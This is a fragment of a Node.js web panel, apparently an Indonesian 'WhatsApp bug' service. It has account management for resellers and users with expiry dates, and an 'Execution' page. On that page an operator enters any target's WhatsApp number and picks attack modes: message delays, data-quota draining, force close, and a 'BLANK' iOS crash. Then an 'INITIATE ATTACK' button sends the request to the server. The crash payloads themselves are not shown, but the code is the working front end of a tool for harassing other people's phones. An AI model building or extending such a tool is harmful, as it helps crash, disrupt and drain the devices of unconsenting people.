            <span class="info-value">${expiredText}</span>
          </div>
          <div class="info-row">
            <span class="info-label">Days Remaining:</span>
            <span class="info-value ${sisaHari <= 7 ? 'warning-text' : ''}">${sisaHari} days</span>
          </div>
        </div>

        <form method="POST" action="/edituser">
          <input type="hidden" name="oldusername" value="${targetUser.username}">
          
          <div class="form-group">
            <label for="username"><i class="fas fa-user"></i> Username</label>
            <input type="text" id="username" name="username" value="${targetUser.username}" required>
          </div>

          <div class="form-group">
            <label for="password"><i class="fas fa-key"></i> Password / Key</label>
            <input type="text" id="password" name="password" value="${targetUser.key}" required>
          </div>

          <div class="form-group">
            <label for="extend"><i class="fas fa-calendar-plus"></i> Extend Duration (Days)</label>
            <input type="number" id="extend" name="extend" min="0" max="365" placeholder="0" value="0">
          </div>

          <div class="form-group">
            <label for="role"><i class="fas fa-shield-alt"></i> Role</label>
            <select id="role" name="role" ${role === 'reseller' ? 'disabled' : ''}>
              ${roleOptions}
            </select>
            ${role === 'reseller' ? '<input type="hidden" name="role" value="' + targetUser.role + '">' : ''}
          </div>

          <!-- PERBAIKAN: TOMBOL DALAM CONTAINER YANG SAMA -->
          <div class="button-group">
            <button type="submit" class="btn btn-save">
              <i class="fas fa-save"></i> SAVE CHANGES
            </button>

            <form method="POST" action="/hapususer" style="display: contents;">
              <input type="hidden" name="username" value="${targetUser.username}">
              <button type="submit" class="btn btn-delete" onclick="return confirm('Are you sure you want to delete user ${targetUser.username}?')">
                <i class="fas fa-trash"></i> DELETE USER
              </button>
            </form>

            <a href="/userlist" class="btn btn-back">
              <i class="fas fa-arrow-left"></i> BACK TO USER LIST
            </a>
          </div>
        </form>
      </div>
    </div>

    <!-- JS Partikel -->
    <script>
      $(document).ready(function() {
        $('#particles').particleground({
          dotColor: '#333333',
          lineColor: '#555555',
          minSpeedX: 0.1,
          maxSpeedX: 0.3,
          minSpeedY: 0.1,
          maxSpeedY: 0.3,
          density: 8000,
          particleRadius: 2,
          curvedLines: false,
          proximity: 100
        });
      });

      // Update role badge when role select changes
      document.getElementById('role')?.addEventListener('change', function() {
        const role = this.value;
        const badge = document.querySelector('.role-badge');
        if (badge) {
          badge.className = \`role-badge role-\${role}\`;
          badge.textContent = role.charAt(0).toUpperCase() + role.slice(1);
        }
      });

      // Add confirmation for delete
      document.querySelector('.btn-delete')?.addEventListener('click', function(e) {
        if (!confirm('Are you sure you want to delete this user? This action cannot be undone.')) {
          e.preventDefault();
        }
      });
    </script>
  </body>
  </html>
  `;
  res.send(html);
});

// Tambahkan ini setelah route GET /edituser
app.post("/edituser", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const sessionRole = currentUser.role || 'user';
  const sessionUsername = username;
  const { oldusername, username: newUsername, password, role, extend } = req.body;

  // Validasi input
  if (!oldusername || !newUsername || !password || !role) {
    return res.send("❌ Semua field harus diisi.");
  }

  // Cari user yang akan diedit
  const targetUserIndex = users.findIndex(u => u.username === oldusername);
  if (targetUserIndex === -1) {
    return res.send("❌ User tidak ditemukan.");
  }

  const targetUser = users[targetUserIndex];

  // 🔒🔒🔒 PROTEKSI AKSES YANG LEBIH KETAT 🔒🔒🔒
  
  // 1. Tidak bisa edit akun sendiri
  if (sessionUsername === oldusername) {
    return res.send("❌ Tidak bisa edit akun sendiri.");
  }

  // 2. Reseller hanya boleh edit user biasa
  if (sessionRole === "reseller" && targetUser.role !== "user") {
    return res.send("❌ Reseller hanya boleh edit user biasa.");
  }

  // 3. Admin tidak boleh edit admin lain ATAU owner
  if (sessionRole === "admin") {
    if (targetUser.role === "admin") {
      return res.send("❌ Admin tidak bisa edit admin lain.");
    }
    if (targetUser.role === "owner") {
      return res.send("❌ Admin tidak bisa edit owner.");
    }
  }

  // 4. Owner bisa edit semua kecuali diri sendiri (sudah dicek di atas)

  // Update data user
  users[targetUserIndex] = {
    ...users[targetUserIndex],
    username: newUsername,
    key: password,
    role: role
  };

  // Tambah masa aktif jika ada
  if (extend && parseInt(extend) > 0) {
    users[targetUserIndex].expired += parseInt(extend) * 86400000;
  }

  saveUsers(users);
  
  // Redirect ke userlist dengan pesan sukses
  res.redirect("/userlist?msg=User " + newUsername + " berhasil diupdate");
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(PORT, () => {
  console.log(`✓ Server aktif di port ${PORT}`);
});

module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};


// ==================== HTML EXECUTION ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  // Bug types data - Simplified titles
  const bugTypes = [
    {
      id: 'delay',
      icon: '<i class="fas fa-hourglass-half"></i>',
      title: '50% Delay'
    },
    {
      id: 'medium',
      icon: '<i class="fas fa-tachometer-alt"></i>',
      title: '100% Delay'
    },
    {
    
      id: 'blank',
      icon: '<i class="fab fa-android"></i>',
      title: 'FORCE 1 MSG'
    },
    {
      id: 'force-close',
      icon: '<i class="fas fa-power-off"></i>',
      title: 'Force Close'
    }
  ];

  return `<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Bug Dashboard - Execution</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* Variabel Warna Baru: Hitam, Putih, Silver */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary-black: #0a0a0a;
            --carbon-dark: #121212;
            --carbon-medium: #1a1a1a;
            --carbon-light: #2a2a2a;
            --accent-silver: #c0c0c0;
            --accent-white: #ffffff;
            --accent-dark-silver: #606060;
            --text-primary: #ffffff;
            --text-secondary: #c0c0c0;
            --success-color: #4CAF50;
            --error-color: #f44336;
        }

        body {
            font-family: 'Rajdhani', sans-serif;
            background: var(--primary-black);
            color: var(--text-primary);
            overflow-x: hidden;
            position: relative;
            -webkit-font-smoothing: antialiased;
            padding: 0;
        }

        .grid-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: var(--primary-black);
            z-index: -2;
            background-image: 
                radial-gradient(var(--accent-dark-silver) 0.5px, transparent 0.5px),
                radial-gradient(var(--accent-dark-silver) 0.5px, transparent 0.5px);
            background-size: 40px 40px;
            background-position: 0 0, 20px 20px;
            opacity: 0.3;
        }

        .hero {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            padding-top: 50px;
            padding-bottom: 50px;
            text-align: center;
        }

        .hero-content {
            max-width: 800px;
            margin-bottom: 40px;
        }

        .hero-title {
            font-family: 'Orbitron', monospace;
            font-size: 3rem;
            font-weight: 900;
            background: linear-gradient(45deg, var(--accent-white), var(--accent-silver));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-transform: uppercase;
            margin-bottom: 10px;
            letter-spacing: 2px;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
        }

        .hero-subtitle {
            color: var(--text-secondary);
            font-size: 1.2rem;
            margin-bottom: 30px;
            font-weight: 400;
        }

        .target-image-section {
            max-width: 600px;
            margin: 0 auto 30px;
            text-align: center;
        }

        .target-image-container {
            position: relative;
            width: 100%;
            max-width: 500px;
            height: 250px;
            margin: 0 auto 20px;
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            border: 2px solid var(--accent-dark-silver);
            transition: all 0.3s ease;
            background: linear-gradient(135deg, #101010, #080808);
        }

        .target-image-container:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.7);
            border-color: var(--accent-silver);
        }

        .target-image {
            width: 100%;
            height: 100%;
            position: relative;
            overflow: hidden;
        }

        .target-image img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            opacity: 0.7;
            position: absolute;
            top: 0;
            left: 0;
            opacity: 0;
            transition: opacity 2s ease-in-out;
        }

        .target-image img.active {
            opacity: 1;
        }

        .target-image-overlay {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(to bottom, rgba(0, 0, 0, 0) 0%, rgba(0, 0, 0, 0.9) 85%);
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
            align-items: center;
            text-align: center;
            padding: 20px;
            z-index: 2;
        }

        .target-text-container {
            position: relative;
            width: 110%;
            overflow: hidden;
        }

        .target-text {
            font-family: 'Orbitron', monospace;
            font-size: 18px;
            color: var(--accent-silver);
            text-transform: uppercase;
            letter-spacing: 2px;
            white-space: nowrap;
            animation: marquee 15s linear infinite;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
            padding: 5px 0;
        }

        @keyframes marquee {
            0% { transform: translateX(100%); }
            100% { transform: translateX(-100%); }
        }

        .target-description {
            color: var(--text-secondary);
            font-size: 15px;
            max-width: 500px;
            margin: 15px auto 0;
            line-height: 1.6;
        }

        .input-section {
            max-width: 500px;
            margin: 0 auto 30px;
            background: var(--carbon-dark);
            border: 1px solid var(--accent-dark-silver);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5);
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-label {
            display: block;
            margin-bottom: 10px;
            color: var(--accent-silver);
            font-weight: 600;
            font-size: 14px;
            text-transform: uppercase;
            font-family: 'Orbitron', monospace;
        }

        .input-field {
            width: 100%;
            padding: 14px 16px;
            border-radius: 12px;
            border: 1px solid var(--accent-dark-silver);
            background: var(--carbon-medium);
            color: var(--text-primary);
            font-size: 15px;
            outline: none;
            transition: 0.3s;
            font-family: 'Rajdhani', sans-serif;
        }

        .input-field:focus {
            border-color: var(--accent-white);
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
            background: var(--carbon-light);
        }

        .menu-toggle-container {
            display: flex;
            justify-content: center;
            margin: 20px 0;
        }

        .menu-toggle {
            display: flex;
            flex-direction: column;
            align-items: center;
            cursor: pointer;
            padding: 10px;
            border-radius: 10px;
            background: var(--carbon-medium);
            border: 1px solid var(--accent-dark-silver);
            transition: all 0.3s ease;
            width: 60px;
        }

        .menu-toggle:hover {
            background: var(--carbon-light);
            border-color: var(--accent-white);
        }

        .menu-toggle span {
            width: 25px;
            height: 3px;
            background: var(--accent-silver);
            margin: 2px 0;
            transition: 0.3s;
            border-radius: 2px;
        }

        .menu-toggle.active span:nth-child(1) {
            transform: rotate(45deg) translate(5px, 5px);
            background: var(--accent-white);
        }

        .menu-toggle.active span:nth-child(2) {
            opacity: 0;
        }

        .menu-toggle.active span:nth-child(3) {
            transform: rotate(-45deg) translate(7px, -6px);
            background: var(--accent-white);
        }

        .bug-dropdown {
            max-width: 600px;
            margin: 0 auto 30px;
            background: var(--carbon-dark);
            border: 1px solid var(--accent-dark-silver);
            border-radius: 20px;
            padding: 20px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5);
            max-height: 0;
            overflow: hidden;
            opacity: 0;
            transition: all 0.5s cubic-bezier(0.4, 0.0, 0.2, 1);
        }

        .bug-dropdown.active {
            max-height: 500px;
            opacity: 1;
            padding: 20px;
        }

        .bug-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
        }

        .bug-card {
            background: var(--carbon-medium);
            border: 1px solid var(--accent-dark-silver);
            border-radius: 12px;
            padding: 15px;
            text-align: center;
            transition: all 0.3s ease;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 120px;
        }

        .bug-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 5px 15px rgba(255, 255, 255, 0.1);
            border-color: var(--accent-silver);
            background: var(--carbon-light);
        }

        .bug-card.selected {
            border: 2px solid var(--accent-white);
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
            transform: scale(1.05);
            background: var(--carbon-light);
        }

        .bug-card-icon {
            width: 40px;
            height: 40px;
            margin-bottom: 10px;
            border-radius: 50%;
            background: linear-gradient(135deg, var(--accent-white), var(--accent-silver));
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            box-shadow: 0 3px 10px rgba(255, 255, 255, 0.4);
            color: var(--primary-black);
        }

        .bug-card-title {
            font-family: 'Orbitron', monospace;
            font-size: 12px;
            font-weight: 700;
            margin-bottom: 5px;
            text-transform: uppercase;
            color: var(--accent-white);
        }

        .bug-card-cta {
            padding: 6px 12px;
            background: linear-gradient(135deg, var(--accent-white), var(--accent-silver));
            border: none;
            border-radius: 15px;
            color: var(--primary-black);
            font-weight: 700;
            text-transform: uppercase;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 10px;
            font-family: 'Orbitron', monospace;
            margin-top: 5px;
        }

        .bug-card-cta:hover {
            transform: translateY(-2px);
            box-shadow: 0 3px 8px rgba(255, 255, 255, 0.4);
        }

        .execute-section {
            text-align: center;
            padding: 40px 16px;
        }

        .execute-btn {
            padding: 18px 50px;
            background: linear-gradient(135deg, var(--accent-white), var(--accent-silver));
            border: none;
            border-radius: 30px;
            color: var(--carbon-dark);
            font-weight: 900;
            text-transform: uppercase;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 16px;
            font-family: 'Orbitron', monospace;
            box-shadow: 0 5px 20px rgba(255, 255, 255, 0.4);
        }

        .execute-btn:hover {
            transform: translateY(-3px);
            background: var(--accent-white);
            box-shadow: 0 8px 30px rgba(255, 255, 255, 0.6);
        }

        .execute-btn:active {
            transform: translateY(-1px);
        }

        .bottom-actions {
            text-align: center;
            padding: 20px;
            margin-top: 40px;
        }

        .back-to-dashboard-btn {
            display: inline-block;
            padding: 15px 30px;
            background: var(--carbon-medium);
            color: var(--accent-silver);
            text-decoration: none;
            border-radius: 30px;
            font-weight: 600;
            transition: all 0.3s ease;
            border: 1px solid var(--accent-dark-silver);
            font-family: 'Orbitron', monospace;
            font-size: 14px;
        }

        .back-to-dashboard-btn:hover {
            background: var(--carbon-light);
            color: var(--accent-white);
            transform: translateY(-3px);
            box-shadow: 0 5px 15px rgba(255, 255, 255, 0.2);
        }

        .attack-success-notification {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: linear-gradient(135deg, rgba(30, 30, 30, 0.95), rgba(10, 10, 10, 0.95));
            color: white;
            padding: 30px 40px;
            border-radius: 20px;
            text-align: center;
            z-index: 10002;
            box-shadow: 0 0 50px rgba(255, 255, 255, 0.4);
            border: 2px solid var(--accent-silver);
            backdrop-filter: blur(10px);
            animation: attackSuccess 0.8s cubic-bezier(0.4, 0.0, 0.2, 1) forwards;
            max-width: 400px;
            width: 90%;
        }

        .attack-success-icon {
            font-size: 4rem;
            margin-bottom: 15px;
            display: block;
            color: var(--success-color);
            animation: bounce 1s ease infinite alternate;
        }

        @keyframes bounce {
            from { transform: scale(1); }
            to { transform: scale(1.1); }
        }

        .attack-success-title {
            font-family: 'Orbitron', monospace;
            font-size: 1.8rem;
            font-weight: 700;
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 2px;
            color: var(--accent-white);
        }

        .attack-success-message {
            font-size: 1rem;
            margin-bottom: 20px;
            opacity: 0.9;
        }

        .attack-progress {
            width: 100%;
            height: 6px;
            background: rgba(255, 255, 255, 0.3);
            border-radius: 3px;
            overflow: hidden;
            margin-top: 15px;
        }

        .attack-progress-bar {
            height: 100%;
            background: linear-gradient(90deg, var(--success-color), #8BC34A);
            width: 0%;
            transition: width 2s linear;
            border-radius: 3px;
        }

        .attack-countdown {
            font-family: 'Orbitron', monospace;
            font-size: 1.2rem;
            color: var(--accent-silver);
            margin-top: 10px;
            font-weight: 700;
        }

        .confetti {
            position: fixed;
            width: 10px;
            height: 10px;
            background: var(--accent-silver);
            opacity: 0;
            z-index: 10001;
        }

        .confetti:nth-child(odd) {
            background: var(--accent-white);
        }

        .confetti:nth-child(even) {
            background: var(--success-color);
        }

        @keyframes attackSuccess {
            0% {
                transform: translate(-50%, -50%) scale(0.3);
                opacity: 0;
            }
            50% {
                transform: translate(-50%, -50%) scale(1.1);
                opacity: 1;
            }
            70% {
                transform: translate(-50%, -50%) scale(1.05);
            }
            100% {
                transform: translate(-50%, -50%) scale(1);
                opacity: 1;
            }
        }

        @keyframes confettiFall {
            0% {
                transform: translateY(-100px) rotate(0deg);
                opacity: 1;
            }
            100% {
                transform: translateY(100vh) rotate(360deg);
                opacity: 0;
            }
        }

        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        @media (max-width: 768px) {
            .hero-title {
                font-size: 2.2rem;
            }
            .target-image-container {
                height: 200px;
            }
            .target-text {
                font-size: 16px;
            }
            .bug-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }
    </style>
</head>
<body>
    <div class="grid-bg"></div>

    <section class="hero">
        <div style="width: 100%; max-width: 1200px; padding: 0 15px;">
            <div class="hero-content">
                <h1 class="hero-title">EXECUTION</h1>
                <p class="hero-subtitle">Sistem Pengeksekusi Kerentanan WhatsApp International Support</p>
            </div>

            <div class="target-image-section">
                <div class="target-image-container">
                    <div class="target-image">
                        <img src="https://files.catbox.moe/3gejhx.jpg" alt="Target Image 1" class="active">
                        <img src="https://files.catbox.moe/axwm3h.jpg" alt="Target Image 2">
                        <img src="https://files.catbox.moe/qf8po7.jpeg" alt="Target Image 3">
                        <div class="target-image-overlay">
                            <div class="target-text-container">
                                <div class="target-text">vzentra v1</div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <p class="target-description">
                    Masukan nomor target <b>WhatsApp</b> dari negara manapun.
                </p>
            </div>

            <div class="input-section">
                <div class="input-group">
                    <label class="input-label" for="numberInput">
                        <i class="fas fa-globe-americas"></i> TARGET NUMBER
                    </label>
                    <input 
                        type="text" 
                        id="numberInput" 
                        class="input-field" 
                        placeholder="Contoh: 628123xxx"
                    />
                </div>
            </div>

            <div class="menu-toggle-container">
                <div class="menu-toggle" id="menuToggle">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
            </div>

            <div class="bug-dropdown" id="bugDropdown">
                <div class="bug-grid" id="bugGrid"></div>
            </div>

            <div class="execute-section">
                <button id="executeBtn" class="execute-btn">
                    <i class="fas fa-radiation"></i> INITIATE ATTACK
                </button>
            </div>
            
            <div class="bottom-actions">
                <a href="/dashboard" class="back-to-dashboard-btn" id="backToDashboardBtn">
                    <i class="fas fa-arrow-left"></i> KEMBALI KE DASHBOARD
                </a>
            </div>
        </div>
    </section>

    <script>
        // State variables
        let selectedBugType = null;
        const bugGrid = document.getElementById('bugGrid');
        const menuToggle = document.getElementById('menuToggle');
        const bugDropdown = document.getElementById('bugDropdown');

        // Data bugTypes yang SESUAI - hanya judul sederhana
        const bugTypes = [
            {
                id: 'delay',
                icon: '<i class="fas fa-hourglass-half"></i>',
                title: '50% Delay'
            },
            {
                id: 'medium',
                icon: '<i class="fas fa-tachometer-alt"></i>',
                title: '100% Delay'
            },
               {
                id: 'drainkuota',
                icon: '<i class="fas fa-tachometer-alt"></i>',
                title: 'sedot kuota'
            },
            {
                id: 'blank',
                icon: '<i class="fab fa-android"></i>',
                title: 'force 1 msg'
            },
            {
                id: 'force-close',
                icon: '<i class="fas fa-power-off"></i>',
                title: 'Force Close'
            },
            {
                id: 'blank-ios',
                icon: '<i class="fas fa-power-off"></i>',
                title: 'BLANK'
            }
        ];

        // Function untuk slideshow gambar
        function initImageSlideshow() {
            const images = document.querySelectorAll('.target-image img');
            let currentIndex = 0;
            
            setInterval(() => {
                images.forEach(img => img.classList.remove('active'));
                currentIndex = (currentIndex + 1) % images.length;
                images[currentIndex].classList.add('active');
            }, 5000);
        }

        function createBugCard(data) {
            const card = document.createElement('div');
            card.className = 'bug-card';
            card.dataset.bugId = data.id;
            
            card.innerHTML = \`
                <div class="bug-card-icon">\${data.icon}</div>
                <h3 class="bug-card-title">\${data.title}</h3>
                <button class="bug-card-cta">SELECT</button>
            \`;
            
            card.addEventListener('click', () => selectBugType(card, data.id));
            
            return card;
        }

        function initBugGrid() {
            // Menggunakan data bugTypes yang sudah didefinisikan
            bugTypes.forEach((data) => {
                const card = createBugCard(data);
                bugGrid.appendChild(card);
            });
        }

        function selectBugType(card, bugId) {
            document.querySelectorAll('.bug-card').forEach(c => {
                c.classList.remove('selected');
            });
            
            card.classList.add('selected');
            selectedBugType = bugId;
            
            const button = card.querySelector('.bug-card-cta');
            button.textContent = '✓ SELECTED';
            
            document.querySelectorAll('.bug-card-cta').forEach(btn => {
                if (btn !== button) {
                    btn.textContent = 'SELECT';
                }
            });
            
            setTimeout(() => {
                toggleDropdown();
            }, 800);
        }

        function toggleDropdown() {
            menuToggle.classList.toggle('active');
            bugDropdown.classList.toggle('active');
        }

        // Validasi nomor internasional
        function isValidPhoneNumber(number) {
            const cleanedNumber = number.replace(/\\D/g, '');
            
            if (cleanedNumber.length < 7 || cleanedNumber.length > 15) {
                return false;
            }
            
            if (cleanedNumber.startsWith('0')) {
                return false;
            }
            
            return true;
        }

        // Execute button handler dengan POST
        document.getElementById('executeBtn').addEventListener('click', async () => {
            const number = document.getElementById('numberInput').value.trim().replace(/\\s+/g, '');
            
            if (!number) {
                showNotification('Masukan nomor target terlebih dahulu!', 'error');
                return;
            }
            
            if (!isValidPhoneNumber(number)) {
                showNotification('Masukan nomor yang valid! Contoh: 628123xxx (Indonesia), 14155552671 (US), 447123456789 (UK)', 'error');
                return;
            }
            
            if (!selectedBugType) {
                showNotification('Pilih jenis bug terlebih dahulu!', 'error');
                return;
            }
            
            // Tampilkan loading
            const executeBtn = document.getElementById('executeBtn');
            const originalText = executeBtn.innerHTML;
            executeBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> MEMPROSES...';
            executeBtn.disabled = true;
            
            try {
                // Kirim request POST
                const response = await fetch('/execution', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        target: number,
                        mode: selectedBugType
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    showAttackSuccessNotification(number, selectedBugType);
                } else {
                    showNotification(data.error || 'Terjadi kesalahan!', 'error');
                }
            } catch (error) {
                console.error('Error:', error);
                showNotification('Terjadi kesalahan jaringan!', 'error');
            } finally {
                // Reset button
                executeBtn.innerHTML = originalText;
                executeBtn.disabled = false;
            }
        });

        // Function untuk menampilkan notifikasi sukses attack
        function showAttackSuccessNotification(number, bugType) {
            // Cari data bug yang sesuai untuk mendapatkan title yang benar
            const bugData = bugTypes.find(bug => bug.id === bugType);
            const bugTitle = bugData ? bugData.title : bugType.toUpperCase();
            
            const overlay = document.createElement('div');
            overlay.className = 'attack-overlay';
            document.body.appendChild(overlay);

            const notification = document.createElement('div');
            notification.className = 'attack-success-notification';
            notification.innerHTML = \`
                <div class="attack-success-icon">
                    <i class="fas fa-globe-americas"></i>
                </div>
                <h2 class="attack-success-title">ATTACK LAUNCHED!</h2>
                <p class="attack-success-message">
                    <strong>\${bugTitle}</strong> berhasil dikirim ke<br>
                    <strong>\${number}</strong>
                </p>
                <div class="attack-countdown" id="countdown">Mengarahkan dalam 3 detik...</div>
                <div class="attack-progress">
                    <div class="attack-progress-bar" id="progressBarAttack"></div>
                </div>
            \`;
            document.body.appendChild(notification);

            createConfetti();

            setTimeout(() => {
                const progressBar = document.getElementById('progressBarAttack');
                progressBar.style.width = '100%';
            }, 100);

            let countdown = 3;
            const countdownElement = document.getElementById('countdown');
            const countdownInterval = setInterval(() => {
                countdown--;
                countdownElement.textContent = \`Mengarahkan dalam \${countdown} detik...\`;
                
                if (countdown <= 0) {
                    clearInterval(countdownInterval);
                    window.location.href = '/execution';
                }
            }, 1000);
        }

        // Function untuk membuat efek confetti
        function createConfetti() {
            const colors = ['var(--accent-silver)', 'var(--accent-white)', 'var(--success-color)'];
            
            for (let i = 0; i < 50; i++) {
                const confetti = document.createElement('div');
                confetti.className = 'confetti';
                confetti.style.left = Math.random() * 100 + 'vw';
                confetti.style.width = Math.random() * 10 + 5 + 'px';
                confetti.style.height = Math.random() * 10 + 5 + 'px';
                confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
                confetti.style.animation = \`confettiFall \${Math.random() * 3 + 2}s linear forwards\`;
                confetti.style.animationDelay = Math.random() * 2 + 's';
                
                document.body.appendChild(confetti);
                
                setTimeout(() => {
                    if (confetti.parentNode) {
                        confetti.parentNode.removeChild(confetti);
                    }
                }, 5000);
            }
        }

        // Function untuk menampilkan notifikasi biasa
        function showNotification(message, type = 'info') {
            const notification = document.createElement('div');
            const bgColor = type === 'error' ? 'var(--error-color)' : 
                           type === 'success' ? 'var(--success-color)' : 
                           'var(--accent-dark-silver)';
            
            notification.style.cssText = \`
                position: fixed;
                top: 20px;
                right: 20px;
                background: \${bgColor};
                color: white;
                padding: 15px 20px;
                border-radius: 10px;
                z-index: 10001;
                max-width: 400px;
                box-shadow: 0 5px 15px rgba(0,0,0,0.3);
                animation: slideIn 0.3s ease;
            \`;
            
            notification.innerHTML = \`
                <div style="display: flex; align-items: center; gap: 10px;">
                    <i class="fas fa-\${type === 'error' ? 'exclamation-triangle' : type === 'success' ? 'check-circle' : 'info-circle'}"></i>
                    <span>\${message}</span>
                </div>
            \`;
            
            document.body.appendChild(notification);
            
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.parentNode.removeChild(notification);
                }
            }, 5000);
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            initBugGrid();
            initImageSlideshow();

            menuToggle.addEventListener('click', toggleDropdown);

            // Ambil parameter dari URL
            const urlParams = new URLSearchParams(window.location.search);
            const fromDashboard = urlParams.get('from') || 'dashboard';
            
            // Atur tombol kembali
            const backButton = document.querySelector('.back-to-dashboard-btn');
            backButton.href = fromDashboard === 'dashboard2' ? '/dashboard2' : '/dashboard';
        });
    </script>
</body>
</html>`;
};